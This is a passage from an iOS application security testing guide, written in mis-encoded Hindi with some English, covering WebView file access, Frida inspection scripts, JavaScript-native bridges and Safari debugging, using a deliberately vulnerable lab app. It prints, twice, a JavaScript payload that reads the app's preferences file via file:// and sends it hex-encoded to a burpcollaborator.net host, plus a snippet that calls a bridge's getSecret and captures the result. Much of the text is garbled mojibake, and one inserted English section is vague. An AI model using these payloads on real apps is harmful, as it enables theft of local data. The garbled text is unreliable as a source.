рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдпрд╣ рдПрдХрд▓ рдлрд╝рд╛рдЗрд▓ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдлрд╝рд╛рдЗрд▓ WebView рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рд╣реЛрдЧреАред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдпрд╣ рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕рднреА рдлрд╝рд╛рдЗрд▓реЗрдВ **WebView рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рд╣реЛ рдЬрд╛рдПрдВрдЧреА**ред рдЗрд╕рд▓рд┐рдП, рдЗрд╕реЗ рдЬрд╛рдВрдЪрдирд╛ рдФрд░ рдпрджрд┐ рдпрд╣ рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ, рддреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдЙрд╕рдореЗрдВ рдХреЛрдИ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдирд╣реАрдВ рд╣реИред

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╕реНрд░реЛрдд рдХреЛрдб рд╣реИ, рддреЛ рдЖрдк рдЗрди рд╡рд┐рдзрд┐рдпреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред **рдХрдВрдкрд╛рдЗрд▓реНрдб** **рдмрд╛рдЗрдирд░реА** рдХреЗ рдкрд╛рд╕ рднреА рдЖрдк рдЗрди рд╡рд┐рдзрд┐рдпреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
### рдлрд╝рд╛рдЗрд▓ рдПрдХреНрд╕реЗрд╕

* **UIWebView:**
* `file://` рд╕реНрдХреАрдо рд╣рдореЗрд╢рд╛ рд╕рдХреНрд╖рдо рд╣реЛрддреА рд╣реИред
* `file://` URL рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдПрдХреНрд╕реЗрд╕ рд╣рдореЗрд╢рд╛ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред
* `file://` URL рд╕реЗ рдпреВрдирд┐рд╡рд░реНрд╕рд▓ рдПрдХреНрд╕реЗрд╕ рд╣рдореЗрд╢рд╛ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред
* рдпрджрд┐ рдЖрдк `baseURL` рдХреЛ `nil` рдкрд░ рд╕реЗрдЯ рдХрд┐рдП рдЧрдП `UIWebView` рд╕реЗ рдкреНрд░рднрд╛рд╡реА рдореВрд▓ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рджреЗрдЦреЗрдВрдЧреЗ рдХрд┐ рдпрд╣ **"null" рдкрд░ рд╕реЗрдЯ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ**, рдмрдЬрд╛рдп рдЗрд╕рдХреЗ рдЖрдк рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВрдЧреЗ: `applewebdata://5361016c-f4a0-4305-816b-65411fc1d78`0ред рдпрд╣ рдореВрд▓ "applewebdata://" "file://" рдореВрд▓ рдХреЗ рд╕рдорд╛рди рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ **рд╕реЗрдо-рдСрд░рд┐рдЬрд┐рди рдиреАрддрд┐ рдХреЛ рд▓рд╛рдЧреВ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдФрд░ рдпрд╣рд╛рдВ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓реЛрдВ рдФрд░ рдХрд┐рд╕реА рднреА рд╡реЗрдм рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХрд╛ рдПрдХреНрд╕реЗрд╕ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИред

{% tabs %}
{% tab title="exfiltrate_file" %}
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
{% endtab %}
{% endtabs %}

* **WKWebView**:
* **`allowFileAccessFromFileURLs`** (`WKPreferences`, `false` by default): рдпрд╣ `file://` scheme URL рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓ рд░рд╣реЗ JavaScript рдХреЛ рдЕрдиреНрдп `file://` scheme URLs рд╕реЗ рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
* **`allowUniversalAccessFromFileURLs`** (`WKWebViewConfiguration`, `false` by default): рдпрд╣ `file://` scheme URL рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓ рд░рд╣реЗ JavaScript рдХреЛ рдХрд┐рд╕реА рднреА рдореВрд▓ рд╕реЗ рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдЖрдк рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕реНрд░реЛрдд рдХреЛрдб рдпрд╛ рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдП рдЧрдП рдмрд╛рдЗрдирд░реА рдореЗрдВ рдЗрди рдлрд╝рдВрдХреНрд╢рди рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЖрдк рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд frida рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```

```bash
frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>
URL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/
Library/WKWebView/scenario1.html
javaScriptEnabled:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  false
allowUniversalAccessFromFileURLs:  0
```
#### рдЕрдирд┐рдпрдорд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓реЗрдВ

To exfiltrate arbitrary files from an iOS app's webview, you can use the following steps:

1. Identify the webview in the app: Inspect the app's source code or use a proxy tool to identify the webview component.

2. Analyze the webview's behavior: Determine how the webview handles file requests and uploads. Look for any vulnerabilities or misconfigurations that can be exploited.

3. Craft a malicious file request: Create a request to retrieve the desired file from the webview. This can be done by intercepting and modifying the app's network traffic.

4. Exploit the vulnerability: Send the malicious file request to the webview and observe the response. If successful, the webview will return the requested file.

5. Extract the file: Save the received file to your local machine or a remote server for further analysis.

By following these steps, you can exfiltrate arbitrary files from an iOS app's webview and gain access to sensitive information.
```javascript
//For some reason this payload doesn't work!!
//Let me know if you know how to exfiltrate local files from a WKWebView
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## рд╡реЗрдмрд╡реНрдпреВрдЬрд╝ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдХрдЯ рдиреЗрдЯрд┐рд╡ рд╡рд┐рдзрд┐рдпрд╛рдБ

iOS 7 рдХреЗ рдмрд╛рдж рд╕реЗ, Apple рдиреЗ APIs рдХреЛ рдкреЗрд╢ рдХрд┐рдпрд╛ рд╣реИ рдЬреЛ **рд╡реЗрдмрд╡реНрдпреВрдЬрд╝ рдореЗрдВ JavaScript рд░рдирдЯрд╛рдЗрдо рдФрд░ рдиреЗрдЯрд┐рд╡** Swift рдпрд╛ Objective-C рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред

рдиреЗрдЯрд┐рд╡ рдХреЛрдб рдФрд░ JavaScript рдХреЗ рдмреАрдЪ рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдХреЗ рджреЛ рдореМрд▓рд┐рдХ рддрд░реАрдХреЗ рд╣реИрдВ:

* **JSContext**: рдЬрдм рдПрдХ Objective-C рдпрд╛ Swift рдмреНрд▓реЙрдХ рдХреЛ `JSContext` рдореЗрдВ рдПрдХ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ JavaScriptCore рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдмреНрд▓реЙрдХ рдХреЛ рдПрдХ JavaScript рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рд▓рдкреЗрдЯ рджреЗрддрд╛ рд╣реИред
* **JSExport protocol**: `JSExport` рд╕реЗ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдореЗрдВ рдШреЛрд╖рд┐рдд рдкреНрд░реЙрдкрд░реНрдЯреА, рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдердб рдФрд░ рдХреНрд▓рд╛рд╕ рдореЗрдердбреНрд╕ рдХреЛ JavaScript рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рд░реВрдк рдореЗрдВ рдореИрдк рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рд╕рднреА JavaScript рдХреЛрдб рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рд╣реЛрддреЗ рд╣реИрдВред рдЬреЛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ JavaScript рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВ рд╣реИрдВ, рдЙрдирдХреЗ рд╕рдВрд╢реЛрдзрди рдиреЗрдЯрд┐рд╡ рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрддреЗ рд╣реИрдВред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдХреЗрд╡рд▓ `JSExport`** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреНрд▓рд╛рд╕ рд╕рджрд╕реНрдпреЛрдВ рдХреЛ JavaScript рдХреЛрдб рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рд╡реЗрдмрд╡реНрдпреВрдЬрд╝ рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗ `JSContext` рдХреЛ рдиреЗрдЯрд┐рд╡ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдХреНрдпрд╛ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЙрд╕реЗ рдЬрд╛рдВрдЪреЗрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдХреЛрдИ рднреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рд╡реЗрдмрд╡реНрдпреВрдЬрд╝ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪрдиреЗ рдФрд░ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред\
Objective-C рдореЗрдВ, `UIWebView` рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗ `JSContext` рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```objectivec
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
рдПрдХ **`WKWebView` рдореЗрдВ JavaScript рдХреЛрдб рдЕрднреА рднреА рдиреЗрдЯрд┐рд╡ рдРрдк рдХреЛ рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди `UIWebView` рдХреА рд╡рд┐рдкрд░реАрддрддрд╛ рдореЗрдВ, `WKWebView` рдХреЗ `JSContext` рдХреЛ рд╕реАрдзреЗ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рд╕рдВрдЪрд╛рд░ рдХреЛ рд╕рдВрджреЗрд╢ рдкреНрд░рдгрд╛рд▓реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдФрд░ `postMessage` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рд╕реНрд╡рджреЗрд╢реА Objective-C рдпрд╛ Swift рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдореЗрдВ рд╕рдВрдЪрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред рд╕рдВрджреЗрд╢ рд╣реИрдВрдбрд▓рд░реНрд╕ рдХреЛ рд╡рд┐рдиреНрдпрд╛рд╕рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рдзрд┐ [`add(_ scriptMessageHandler:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯрдмреНрд░рд┐рдЬ рд╕рдХреНрд╖рдо рдХрд░рдирд╛
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### рд╕рдВрджреЗрд╢ рднреЗрдЬрдирд╛

рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдВрджреЗрд╢ рд╣реИрдВрдбрд▓рд░ `"рдирд╛рдо"` (рдпрд╛ рдЙрдкрд░реЛрдХреНрдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ `"javaScriptBridge"`) рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рдиреЗ рд╕реЗ, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рд╛рдордЧреНрд░реА рдирд┐рдпрдВрддреНрд░рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рдЙрди рд╕рднреА рд╡реЗрдм рд╡реНрдпреВ рдореЗрдВ рд╕рднреА рдлреНрд░реЗрдореЛрдВ рдореЗрдВ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдлрд╝рдВрдХреНрд╢рди `window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage` рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕реЗ рдлрд┐рд░ [рдПрдЪрдЯреАрдПрдордПрд▓ рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33):
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
//After testing the previos funtion I got the error TypeError: undefined is not an object (evaluating 'window.webkit.messageHandlers')
//But the following code worked to call the exposed javascriptbridge with the args "addNumbers", "1", "2"

document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
рдЬрдм рдиреЗрдЯрд┐рд╡ рдлрдВрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдорддреМрд░ рдкрд░ рд╡рд╣ **рд╡реЗрдм рдкреЗрдЬ рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛** (рдиреАрдЪреЗ `evaluateJavascript` рджреЗрдЦреЗрдВ) рдЖрдкрдХреЛ рдЗрдВрдЯрд░реЗрд╕реНрдЯ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ **рд╡рд╣ рдлрдВрдХреНрд╢рди рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░рдирд╛** рдЬреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдк **рдкрд░рд┐рдгрд╛рдо рдЪреЛрд░реА** рдХрд░ рд╕рдХреЗрдВред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдлрдВрдХреНрд╢рди **`javascriptBridgeCallBack`** 2 рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИ (рдмреБрд▓рд╛рдП рдЧрдП рдлрдВрдХреНрд╢рди рдФрд░ **рдкрд░рд┐рдгрд╛рдо**)ред рдпрджрд┐ рдЖрдк HTML рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рд▓реЛрдб рд╣реЛрдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рдкрд░рд┐рдгрд╛рдо рдХреЗ рд╕рд╛рде рдПрдХ **рдЕрд▓рд░реНрдЯ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ:
```markup
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
### рдмреБрд▓рд╛рдИ рдЧрдИ рдлрд╝рдВрдХреНрд╢рди

рдмреБрд▓рд╛рдИ рдЧрдИ рдлрд╝рдВрдХреНрд╢рди [`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29) рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```
### рдкрд░реАрдХреНрд╖рдг

рдПрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рднреАрддрд░ postMessage рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* рд╕рд░реНрд╡рд░ рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдмрджрд▓реЗрдВ (MitM)
* рдлреНрд░реЗрдорд╡рд░реНрдХ рдЬреИрд╕реЗ Frida рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбрд╛рдпрдиреЗрдорд┐рдХ рдЗрдВрд╕реНрдЯреНрд░реБрдореЗрдВрдЯреЗрд╢рди рдХрд░реЗрдВ рдФрд░ iOS WebViews рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз JavaScript рдорд╛рд▓ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ ([`UIWebView`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc) рдХреЗ рд▓рд┐рдП `stringByEvaluatingJavaScriptFromString:` рдФрд░ [`WKWebView`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc) рдХреЗ рд▓рд┐рдП `evaluateJavaScript:completionHandler:`)ред

## iOS WebViews рдХрд╛ рдбреАрдмрдЧрд┐рдВрдЧ

([https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews) рд╕реЗ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓)

iOS рд╡реЗрдмрд╡реНрдпреВ рдореЗрдВ, `console.log()` рдХреЛ рдкрд╛рд╕ рдХрд┐рдП рдЧрдП рд╕рдВрджреЗрд╢ Xcode рд▓реЙрдЧ рдореЗрдВ _рдирд╣реАрдВ_ рдкреНрд░рд┐рдВрдЯ рд╣реЛрддреЗ рд╣реИрдВред Safari рдХреЗ рдбреЗрд╡рд▓рдкрд░ рдЯреВрд▓ рдХреЗ рд╕рд╛рде рд╡реЗрдм рд╕рд╛рдордЧреНрд░реА рдХреЛ рдбреАрдмрдЧ рдХрд░рдирд╛ рдЕрднреА рднреА рдЕрдкреЗрдХреНрд╖рд╛рдХреГрдд рдЖрд╕рд╛рди рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдХреБрдЫ рд╕реАрдорд╛рдПрдВ рд╣реИрдВ:

* iOS рд╡реЗрдмрд╡реНрдпреВ рдХреА рдбреАрдмрдЧрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП Safari рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЗ рдбреЗрд╡ рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ macOS рдЪрд▓ рд░рд╣рд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред
* рдЖрдк рдХреЗрд╡рд▓ Xcode рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдкрдиреА рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░ рд▓реЛрдб рдХреА рдЧрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд╡реЗрдмрд╡реНрдпреВ рдХреА рдбреАрдмрдЧрд┐рдВрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдРрдк рд╕реНрдЯреЛрд░ рдпрд╛ Apple Configurator рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдРрдкреНрд╕ рдореЗрдВ рд╡реЗрдмрд╡реНрдпреВ рдХреА рдбреАрдмрдЧрд┐рдВрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред

рдЗрди рд╕реАрдорд╛рдУрдВ рдХреЗ рд╕рд╛рде, рдпрд╣рд╛рдВ iOS рдореЗрдВ рд╡реЗрдмрд╡реНрдпреВ рдХреА рд░рд┐рдореЛрдЯ рдбреАрдмрдЧрд┐рдВрдЧ рдХрд░рдиреЗ рдХреЗ рдЪрд░рдг рд╣реИрдВ:

* рдкрд╣рд▓реЗ, рдЕрдкрдиреА iOS рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░ Safari рд╡реЗрдм рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ, рдЗрд╕рдХреЗ рд▓рд┐рдП iOS _рд╕реЗрдЯрд┐рдВрдЧреНрд╕_ рдРрдк рдЦреЛрд▓реЗрдВ, **рд╕реЗрдЯрд┐рдВрдЧреНрд╕ > рд╕рдлрд╛рд░реА > рдЙрдиреНрдирдд** рдореЗрдВ рдЬрд╛рдПрдВ рдФрд░ _рд╡реЗрдм рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░_ рд╡рд┐рдХрд▓реНрдк рдХреЛ рдЯреЙрдЧрд▓ рдХрд░реЗрдВред

![iOS Safari рд╕реЗрдЯрд┐рдВрдЧреНрд╕](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/ios-safari-settings.jpg)

